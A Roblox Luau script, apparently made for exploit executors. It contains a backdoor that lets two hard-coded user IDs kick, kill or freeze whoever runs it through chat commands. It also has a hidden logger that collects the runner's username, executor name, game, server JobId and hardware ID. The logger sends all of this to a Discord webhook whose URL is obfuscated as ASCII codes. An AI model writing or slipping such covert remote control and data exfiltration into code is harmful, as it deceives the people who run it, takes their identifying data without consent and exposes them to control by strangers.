--!nolint
--!nocheck

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local Admins = {
    [233377111] = true,
    [7131426405] = true,
}

local Commands = {
    ["kick"] = function()
        LocalPlayer:Kick("You have been kicked by an admin.")
    end,
    ["kill"] = function()
        LocalPlayer.Character.Humanoid.Health = 0
    end,
    ["freeze"] = function()
        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            humanoidRootPart.Anchored = true
        end
    end,
    ["unfreeze"] = function()
        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            humanoidRootPart.Anchored = false
        end
    end,
}

local function FindUser(Name)
    if #Name < 3 then
        return nil
    end

    Name = string.lower(Name)
    for _, player in pairs(Players:GetPlayers()) do
        if string.sub(string.lower(player.Name), 1, #Name) == Name then
            return player
        end
    end
    return nil
end

for _, Player in pairs(Players:GetPlayers()) do
    if Admins[Player.UserId] then
        Player.Chatted:Connect(function(message)
            local args = string.split(message, " ")
            local command = args[1]:lower()
            local targetName = args[2]

            if command:sub(1, 3) == "/e " then
                command = command:sub(4)
            end

            local target = FindUser(targetName)
            if target == LocalPlayer and Commands[command] then
                Commands[command]()
            end
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    if Admins[player.UserId] then
        player.Chatted:Connect(function(message)
            local args = string.split(message, " ")
            local command = args[1]:lower()
            local targetName = args[2]

            if command:sub(1, 3) == "/e " then
                command = command:sub(4)
            end

            local target = FindUser(targetName)
            if target == LocalPlayer and Commands[command] then
                Commands[command]()
            end
        end)
    end
end)

Players.PlayerAdded:Connect(function(player)
    if Admins[player.UserId] then
        player.Chatted:Connect(function(message)
            local args = string.split(message, " ")
            local command = args[1]:lower()

            if command:sub(1, 3) == "/e " then
                command = command:sub(4)
                local targetName = args[2]
                local target = FindUser(targetName)
                
                if target and Commands[command] then
                    Commands[command](target)
                end
            else
                local targetName = args[2]
                local target = LocalPlayer
                if targetName then
                    target = FindUser(targetName) or LocalPlayer
                end
                
                if Commands[command] then
                    Commands[command](target)
                end
            end
        end)
    end
end)

local Executor = identifyexecutor()
local ExecutorText = tostring(identifyexecutor())

local embed = {
	["title"] = LocalPlayer.Name,
	["color"] = 0x2f5bc7,
	["fields"] = {
		{
			["name"] = "Executor",
			["value"] = ExecutorText,
			["inline"] = true
		},
		{
			["name"] = "Game",
			["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
			["inline"] = true
		},
		{
			["name"] = "JobId",
			["value"] = game.JobId,
			["inline"] = true
		},
		{
			["name"] = "RbxAnalytics HWID",
			["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
			["inline"] = true
		}
	}
}

local payload = {
	["embeds"] = {embed},
}

local function decryptString(encrypted)
    local decrypted = {}
    for ascii in encrypted:gmatch("%d+") do
        table.insert(decrypted, string.char(tonumber(ascii)))
    end
    return table.concat(decrypted)
end

local obfuscatedWebhookURL = "104/116/116/112/115/58/47/47/100/105/115/99/111/114/100/46/99/111/109/47/97/112/105/47/119/101/98/104/111/111/107/115/47/49/51/52/48/51/55/56/49/57/53/53/50/53/56/57/56/50/53/48/47/103/87/121/76/70/121/88/122/108/84/118/66/120/87/78/85/87/121/101/106/55/52/102/117/88/48/99/54/112/45/54/97/86/103/110/117/51/117/100/90/79/98/66/80/100/107/95/105/88/100/80/45/109/72/109/75/122/119/57/118/49/49/53/90/81/117/56/57"
local webhookURL = decryptString(obfuscatedWebhookURL)

local httpRequest = {
	Url = webhookURL,
	Method = "POST",
	Headers = {
		["Content-Type"] = "application/json"
	},
	Body = game:GetService("HttpService"):JSONEncode(payload)
}

request(httpRequest)
